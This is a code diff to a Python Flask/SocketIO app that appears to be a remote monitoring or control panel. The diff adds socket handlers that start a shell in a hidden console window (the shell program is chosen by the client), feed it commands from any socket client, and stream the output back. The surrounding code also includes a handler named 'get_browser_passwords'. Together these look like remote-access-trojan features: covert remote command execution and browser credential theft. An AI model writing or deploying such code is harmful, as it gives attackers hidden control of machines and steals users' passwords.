@@ -2,6 +2,8 @@ import os
 import sys
 import platform
 import socket as _sock
+import subprocess
+import threading
 from flask import Flask, render_template, jsonify, request
 from flask_socketio import SocketIO
 import processes as proc
@@ -349,6 +351,60 @@ def on_get_monitors(_data=None):
         socketio.emit("monitors_result", {"monitors": monitors})
     except Exception as e:
         socketio.emit("monitors_result", {"monitors": [], "error": str(e)})
+
+
+_shell_proc = None
+
+@socketio.on("shell_start")
+def on_shell_start(data):
+    global _shell_proc
+    if _shell_proc and _shell_proc.poll() is None:
+        socketio.emit("shell_started", {"ok": False, "error": "shell already running"})
+        return
+    try:
+        shell = (data or {}).get("shell", "cmd.exe")
+        proc_obj = subprocess.Popen(
+            [shell], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT, creationflags=0x08000000, bufsize=0,
+        )
+        _shell_proc = proc_obj
+        def _read():
+            global _shell_proc
+            while proc_obj.poll() is None:
+                try:
+                    line = proc_obj.stdout.readline()
+                    if line:
+                        socketio.emit("shell_output", {"data": line.decode(errors="replace")})
+                except Exception:
+                    break
+            socketio.emit("shell_output", {"data": "", "closed": True})
+            _shell_proc = None
+        threading.Thread(target=_read, daemon=True, name="shell-out-local").start()
+        socketio.emit("shell_started", {"ok": True})
+    except Exception as e:
+        socketio.emit("shell_started", {"ok": False, "error": str(e)})
+
+@socketio.on("shell_input")
+def on_shell_input(data):
+    global _shell_proc
+    if not _shell_proc or _shell_proc.poll() is not None:
+        return
+    try:
+        cmd = (data or {}).get("cmd", "") + "\n"
+        _shell_proc.stdin.write(cmd.encode(errors="replace"))
+        _shell_proc.stdin.flush()
+    except Exception:
+        pass
+
+@socketio.on("shell_stop")
+def on_shell_stop(_data=None):
+    global _shell_proc
+    if _shell_proc:
+        try:
+            _shell_proc.kill()
+        except Exception:
+            pass
+        _shell_proc = None
 
 
 @socketio.on("get_browser_passwords")
